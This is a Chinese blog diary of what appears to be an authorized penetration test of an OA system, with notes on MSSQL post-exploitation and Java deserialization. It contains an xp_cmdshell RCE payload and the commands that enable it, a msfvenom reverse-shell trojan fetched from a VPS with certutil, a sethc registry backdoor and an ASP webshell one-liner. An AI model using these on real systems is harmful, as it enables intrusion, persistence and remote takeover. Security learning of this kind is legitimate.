---
title: 摸鱼鸭～
date: 2020-02-12 12:06:18
tags:
thumbnail: "https://s2.ax1x.com/2020/02/16/3pX7LR.jpg"
---

记录一下这半天在家远程摸鱼的日站

首先这是个oa，又是oa！之前致远oa的洞上传了shell却访问报错难受洗窝惹orz，没想到这个oa也有nday：）

sql执行接口，先试了一下sql命令，被拦了，喵喵喵又是connection reset，然后试一下xp_cmdshell的rce payload： `/ServiceAction/com.velcro.base.DataAction?sql=xp_cmdshell%20%27whoami%27` ，提示SQL Server阻止了对sys.xp_cmdshell的访问，那说明这儿的命令执行是存在的嘛～

然后窝在搜SQL Server有啥命令的时候才突然发现原来SQL Server就是Mssql？？那为什么要有两种叫法？我一直以为是不一样的！怀疑喵生QAQ（还不是因为又菜又懒嘤嘤嘤

搜到了Mssql在xp_cmdshell默认关闭时命令执行的方法——CLR？orz一眼瞟过没看懂，于是又康到了激活xp_cmdshell的命令：

```
exec sp_configure 'show advanced options', 1; 
reconfigure; 
exec sp_configure 'xp_cmdshell', 1; 
reconfigure; 
exec sp_configure 'show advanced options', 0; 
reconfigure;
```

或者：

```
EXEC sp_configure 'show advanced options', 1 ;  reconfigure;  //允许修改高级参数
EXEC exec sp_configure 'xp_cmdshell', 1 ; reconfigure;  //打开xp_cmdshell扩展
```

然后完全不抱希望地试了一下，好像是返回报错说sql语句未返回任何结果之类的

桥豆麻袋！没返回结果！那是不是成功修改惹鸭！

继续不报希望地 `sql=xp_cmdshell%20%27whoami%27` 返回了！返回了administrator！

激动的心，颤抖的手哈哈哈哈哈哈哈嗝（菜鸡就是如此卑微，有个rce就开心得不行嘤嘤嘤

chdir一下发现是c盘system32路径；dir一下是一些乱七八糟的文件；ping一下发现可以出外网；net user一下发现米有权限

讲道理窝一直以为Windows也可以一句话弹shell的，所以自从上次日到rce但是没试一下shell之后就一直想着

于是现在又有个良机x怎么能不试一哈捏qvq

然后一搜，原来Windows这么麻烦Orz还不如直接找网站功能传shell呢

但是猥琐的窝还是在vps上哒上了kali的docker装上了msf生成了木马放到了web服务里x

```
sudo apt-get install docker.io  安装docker
docker pull kalilinux/kali-linux-docker  拉取kali镜像
docker run -t -i kalilinux/kali-linux-docker /bin/bash  启动并进入容器
apt-get update && apt-get upgrade
apt-get install metasploit-framework  安装msf
msfconsole -L
exit
docker commit ***** msf  保存容器为镜像
docker run -t -p 8888:8888 -i msf /bin/bash 映射vps同个端口

msfvenom -p windows/meterpreter/reverse_tcp lhost=*.*.*.* lport=8888 -f exe > /root/horse.exe  生成默认木马
docker cp *****:root/horse.exe /root  拷贝出来
python3 -m http.server  开启web服务（要用py3哦）
```

确认一下木马已经就绪啦，然后来康康windows命令行咋下载～

惊了。windows真的好鸡儿麻烦。搜到的都是说用powershell，可是运行了一下又是拒绝。什么curl啊wget啊都米有。突然想到前几天直播课是不是讲了个啥下载证书用的Windows命令来着，赶紧去搜了一下，没错就是CertUtil！

于是 `certutil -urlcache -split -f http://vps_ip:8000/sysrf.exe sysrf.exe`

显示 `**** 联机 ****, 000000 ..., 01204a,CertUtil: -URLCache 命令成功完成。` 

一看目录，米有多出来窝sysrf鸭，启动窝的win10虚拟机试了一下，发现这个systen32原来是普通账号没权限写的，而且defender秒删窝的exe233333

目标机子好像是Windows Server 2008R2，先换个目录试试 `type nul>d:\test\test` 写入成功

远程test文件d盘也下载成功，exe失败

关掉了窝的defender用CertUtil decode了一下

下载成功！

`certutil -decode d:\test\sysrf.b64 d:\test\sysrf.exe` 

`输入长度=101536 输出长度=0` 

菊花一紧x，果然是被删了呜呜呜呜呜

于是开始康如何免杀，好不容易哒好了cs发现我们的平台生成的居然有密码orz

因为太晚了准备第二天问的，不行的话再试试empire的，第二天一打开执行的地方

“您正在试图非法攻击”

？？？？？呜呜呜呜呜呜呜呜

---

反思一下，自己还是太蠢太naive，操作不够 ~~骚~~ 快， ~~运维人员居然是真实存在的（废话~~ 

应该先Tasklist康康是啥安全软件的，然后找找网站目录的，这样直接asp一句话好了鸭（继续yy。。。

总而言之Windows真的太讨厌惹！

睡觉前还在想第二天怎么搞x结果x

oa弱密码进去各种功能也都有waf拦着，唉

---

总结别的一些嗖嗖嗖的时候瞧见的：

> SQL-SERVER的常规GetShell思路：
>
> 1.确认当前的数据库用户权限为sysadmin
> 2.直接备份数据/调用可以命令执行的存储过程，如Xp_cmdshell等
> 3.若用户非sa权限则考虑差异备份 Log备份等

>除了xp_cmdshell还有操作注册表的
>
>```
>xp_regaddmultistring
>xp_regdeletekey //删除键
>xp_regdeletevalue //删除值
>xp_regenumkeys
>xp_regenumvalues //返回多个值
>xp_regread //读取键值
>xp_regremovemultistring
>xp_regwrite //写入键值 xp_regwrite 根键,子键, 值名, 值类型, 值
>控制服务的xp_servicecontrol等
>
>开启telnet服务
>execmaster..xp_servicecontrol 'start', 'tlntsvr'
>写入shift后门
>exec xp_regwrite
>'HKEY_LOCAL_MACHINE',
>'SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Image File Execution Options\sethc.exe',
>'debugger',
>'REG_SZ',
>'c:\\windows\\system32\\taskmgr.exe'
>16进制
>exec xp_regwrite
>0x484b45595f4c4f43414c5f4d414348494e45,
>0x534f4654574152455c4d6963726f736f66745c57696e646f7773204e545c43757272656e7456657273696f6e5c496d6167652046696c6520457865637574696f6e204f7074696f6e735c73657468632e657865,
>0x6465627567676572,
>0x5245475f535a,
>查看远程桌面开启
>exec xp_regread
>'HKEY_LOCAL_MACHINE','SYSTEM\CurrentControlSet\Control\TerminalServer',
>'fDenyTSConnections'
>开启远程桌面
>exec xp_regwrite
>'HKEY_LOCAL_MACHINE','SYSTEM\CurrentControlSet\Control\TerminalServer',
>'fDenyTSConnections',
>'REG_DWord',0
>```

> sp_makewebtask写入一句话
>
> ```
> exec sp_configure 'Web AssistantProcedures', 1; RECONFIGURE
> exec sp_makewebtask 'c:\1.asp','select''<%execute(request("ruo"))%>'''
> ```

---

还有另一个资产居然和我们组长一样的，窝瑟瑟发抖

弱密码进去一康是管理微信公众号各种后台的，搜了一下一些都不像鸭

看了一下系统有米有指纹也米有啊，然后用了个看起来奇葩一点的路径去github一搜，居然真的搞到了真的。。。

2star我还不太信，结果看到了默认用户名密码还真一样，找了个路径一访问。。。绝对是真的。窝惊了。

然后就开始瞎几把审计？像模像样地和大佬一样找路由和upload点？

第一下看的都是aspx，感觉有点不对？

才发现原来.cs才是后端代码。。。原来C#是和.net一起用哒Orz

幸好代码都长一个样，直接构造了一下访问的接口居然全都是未授权

然后又像模像样地各种函数跟进跟进？

飘了。好的窝会审计了。（才怪

别的还有各种垃圾高危就不嗦了。这个系统本身的广告页面都没删。随便一注册就是管理员。随便一登录就能越权。appsecret到处都是。有waf了不起啊。（就是了不起呜呜呜，只能对着源码找点逻辑漏洞

总之幸好站太辣鸡大概没有被嫌弃～嘿嘿

另外原来这种站要传asmx和ashx的马才会解析，窝还想传.cs？

---

碰到有意思的站还是比较酥糊qvq，心疼另外几只要么没账号要么只有静态页面的哈哈哈哈哈，但是老哥们还是强的，学到一个sqlmap的--random-agent

---

还有就是前几天终于开始康了一下java反序列化，觉得寄几大概有那么一点点点点懂了！

[这篇](https://paper.seebug.org/312/)还挺好，过了几天才有时间来这顺便写一下，，然后就发现快忘光了？

首先java反序列化和php都是序列化一个类，区别就是一个只是个肉眼就能反序列的字符串，另一个序列化后就成了文件（不过也是一串二进制啦，具体每个字节啥意思可以搜一下用那个分析脚本康一下就明白啦），特征是 `ac ed 00 05`或`rO0AB` 

然后窝心里java的特征就是库贼多，各种名字贼长，果然有了问题就很难修，修好了又被找到新的方法，xswl

总之就是执行重写的readObject中通过各种构造各种链然后就调用到执行了？（大概

整个反序列化各种底层调用的过程可以看组里大佬[两篇深究文章](http://www.lmxspace.com/2019/11/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%87%E7%A8%8B%E6%B7%B1%E7%A9%B6/#CVE-2019-2890)嘻嘻（窝这么菜只能白嫖x毕竟窝在摸鱼/碎觉/发呆呆的时候人家在各种调试各种挖洞

另外也就是囫囵吞枣地理解了一下那几个特别有名的洞

看来看去感觉还是觉得好复杂Orz本来就不咋会java，过几天几个月再回头看看叭qvq

总之反射是个神奇的东西，还有这里面代理到底是啥，等我懂了再更（瘫

判断有无反序列化相关漏洞：

- 反序列化文件特征
- Java RMI 的传输 100% 基于反序列化，默认端口1099
- 可以被序列化的类一定实现了`Serializable`接口
- 反序列化时的`readObject()`方法是否重写
- 其实最有用的是看系统版本是不是爆出过洞最靠谱23333

另外有空康康ysoserial这个神器，这次就到这儿8，研究大创和毕设去了

（下次一定x

---

最后终于跨过山跨过河肥来摸鱼惹，隔壁熊孩子还是一样的吵，自己烧哒饭还是一样哒好次嘻嘻（脸呢

虽然总是会有阴霾在QAQ，蛋2020能活着已经是莫大的幸运啦

要继续活着鸭

---

学校一波操作窝惊了，被气洗。[断断续续](https://www.anquanke.com/post/id/194384)的[更新](https://www.oreilly.com/library/view/learning-java/1565927184/ch11s04.html)

RMI：Remote Method Invocation，就是自面意思，可以调用远程对象方法，当C的远程调用remote procedure calls (RPC) 只传递数据结构时，java可以处理数据和方法哦 -》所以用一般会用序列化，但也有动态加载可以安全地转化？

远程对象只是提供一个引用，实际的方法还是发生在远程的java虚拟机（这个类本来的地方）上滴；也有Nonremote objects，就是简单的copy传递。

stubs：在这一端的代理，等于占位，向skeletons发出调用；skeletons：对象本身所在的那一端，接收stubs请求。这两个都是底层自动的。

远程对象和stub都实现远程接口，继承java.rmi.Remote接口。

远程对象的实际实现是继承java.rmi.server.UnicastRemoteObject，构造时监听stubs请求。

RMI registry：启动rmi并且找到对应类

Java默认JRMP协议，Weblogic使用T3协议。

一个对象远程传输需要序列化，需要使用到这个对象就需要从序列化的数据中恢复这个对象，恢复这个对象时对应的readObject、readExternal等方法会被自动调用。

[找洞](https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/)：判断了是否存在易受攻击的库/易受攻击的特征->搜集端口信息->针对性的触发流量->在流量中寻找反序列化特征->开发利用程序

JNDI (Java Naming and Directory Interface) ，包括Naming Service和Directory Service。

渐渐失去理智。。。